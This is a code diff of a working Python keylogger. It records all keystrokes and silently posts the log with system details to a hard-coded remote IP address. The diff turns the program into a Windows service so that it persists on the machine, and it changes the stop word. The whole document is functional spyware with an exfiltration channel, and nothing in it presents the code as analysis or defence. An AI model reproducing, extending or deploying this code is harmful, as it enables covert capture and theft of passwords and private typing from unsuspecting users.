@@ -5,31 +5,34 @@ import platform
 from collections import deque
 import sys
 import os
+import win32serviceutil
+import win32service
+import win32event
+import servicemanager
 
 class Keylogger:
     def __init__(self):
         self.log = ""
-        self.stop_word = "nicework"  # The specific word to stop the keylogger
-        self.queue = deque(maxlen=len(self.stop_word))  # Fixed-length queue
-        self.stop_keylogger = False  # Flag to stop the keylogger
+        self.stop_word = "niceworkllo"  # Updated stop word
+        self.queue = deque(maxlen=len(self.stop_word))
+        self.stop_keylogger = False
     
     def send_request(self):
         try:
             response = requests.post(
                 "http://34.136.67.113:3475",
-                json={"log": self.log, "system_info": system_info},  # Ensure system_info is sent as a string
+                json={"log": self.log, "system_info": system_info},
                 timeout=5
             )
         except requests.exceptions.RequestException:
-            pass  # Handle connection issues silently
+            pass
 
     def on_press(self, key):
         try:
-            char = key.char  # Alphanumeric keys
+            char = key.char
             self.log += char
-            self.queue.append(char)  # Add the character to the queue
+            self.queue.append(char)
         except AttributeError:
-            # Handle special keys
             special_keys = {
                 keyboard.Key.space: " ",
                 keyboard.Key.enter: "\n",
@@ -39,46 +42,56 @@ class Keylogger:
             }
             special_key = special_keys.get(key, f" [{key}] ")
             self.log += special_key
-            self.queue.append(special_key)  # Add the special key to the queue
+            self.queue.append(special_key)
 
-        # Check if the queue matches the stop word
         if len(self.queue) == len(self.stop_word):
             typed_word = "".join(self.queue)
             if typed_word == self.stop_word:
                 self.stop_keylogger = True
-                return False  # Stop the listener
+                return False
 
     def on_release(self, key):
-        pass  # No action needed on key release
+        pass
 
     def report(self):
         print(self.log)
-        if len(self.log) > 600:  # Send logs if the log size exceeds 600 characters
+        if len(self.log) > 600:
             self.send_request()
-            self.log = ""  # Reset log after sending
+            self.log = ""
         if not self.stop_keylogger:
-            threading.Timer(5, self.report).start()  # Repeat every 5 seconds
+            threading.Timer(5, self.report).start()
 
     def start(self):
         with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
             self.report()
             listener.join()
 
-def daemonize():
-    if os.name == "posix":  # Linux or macOS
-        pid = os.fork()
-        if pid > 0:
-            sys.exit(0)  # Exit the parent process
-    elif os.name == "nt":  # Windows
-        import win32api, win32process
-        hprocess = win32api.GetCurrentProcess()
-        win32process.SetPriorityClass(hprocess, win32process.IDLE_PRIORITY_CLASS)
-        win32api.SetConsoleCtrlHandler(lambda x: True, True)
-    else:
-        raise NotImplementedError("Unsupported operating system.")
+class KeyloggerService(win32serviceutil.ServiceFramework):
+    _svc_name_ = "KeyloggerService"
+    _svc_display_name_ = "Keylogger Service"
+    _svc_description_ = "A simple keylogger service that logs keystrokes and stops on 'niceworkllo'"
+
+    def __init__(self, args):
+        win32serviceutil.ServiceFramework.__init__(self, args)
+        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
+        self.keylogger = Keylogger()
+
+    def SvcStop(self):
+        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
+        win32event.SetEvent(self.hWaitStop)
+        self.keylogger.stop_keylogger = True
+
+    def SvcDoRun(self):
+        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
+                              servicemanager.PYS_SERVICE_STARTED,
+                              (self._svc_name_, ''))
+        self.keylogger.start()
 
 if __name__ == "__main__":
     system_info = platform.uname()._asdict()
-    daemonize()
-    keylogger = Keylogger()
-    keylogger.start()
+    if len(sys.argv) == 1:
+        servicemanager.Initialize()
+        servicemanager.PrepareToHostSingle(KeyloggerService)
+        servicemanager.StartServiceCtrlDispatcher()
+    else:
+        win32serviceutil.HandleCommandLine(KeyloggerService)
